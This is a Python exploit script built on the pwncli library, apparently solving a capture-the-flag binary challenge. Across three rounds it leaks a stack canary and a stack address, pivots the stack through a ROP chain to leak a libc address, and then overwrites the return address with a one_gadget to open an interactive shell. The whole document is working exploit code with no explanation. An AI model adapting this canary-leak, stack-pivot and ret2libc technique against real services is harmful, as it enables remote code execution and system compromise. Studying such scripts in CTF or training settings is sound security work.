#!/usr/bin/python3
from pwncli import *

cli_script()

p:tube = gift['io']
libc: ELF = gift['libc']

gadgets = [0x4f2c5, 0x4f322, 0x10a38c]

p.sendlineafter("please input your name\n", "aeojj")
p.sendafter("do you want to get something???\n", "a"*0x28)
p.sendafter("OK???\n", "a"*0x29)
m = p.recvline_startswith("6666")[0x2d:]
log_ex(f"get msg: {m}")
canary = u64_ex(m[0:7]) << 8
log_address("canary", canary)
stack_addr  = u64_ex(m[7:])
log_address("stack addr", stack_addr)

payload = flat({
    0x28: canary,
    0x38: p8(0x7b)
    })
p.sendafter("I think you can do something now\n", payload)

# 第二次
p.sendafter("do you want to get something???\n", "a"*0x28)
p.sendafter("OK???\n", "a"*0x29)
m = p.recvline_startswith("6666")[0x3c:]
log_ex(f"get msg: {m}")

code_base_addr = u64_ex(m) - 0x1380
log_code_base_addr(code_base_addr)

payload = flat({
    0:[
        code_base_addr + 0x14a3,
        code_base_addr + 0x201F58,
        code_base_addr + 0xe50,
        code_base_addr + 0xe31,
        code_base_addr + 0x10de
    ],
    0x28: [canary, stack_addr-0x48],
    0x38: code_base_addr+0x10dc # leave ret
    })
p.sendafter("I think you can do something now\n", payload)

m = p.recvn(6)

libc_base = u64_ex(m) - libc.sym['__libc_start_main']
log_libc_base_addr(libc_base)
libc.address = libc_base

# 第三次
p.sendafter("do you want to get something???\n", "a"*0x28)
p.sendafter("OK???\n", "a"*0x29)

payload = flat({
    0x28: canary,
    0x38: libc_base + gadgets[1]
    })
p.sendafter("I think you can do something now\n", payload)

p.interactive()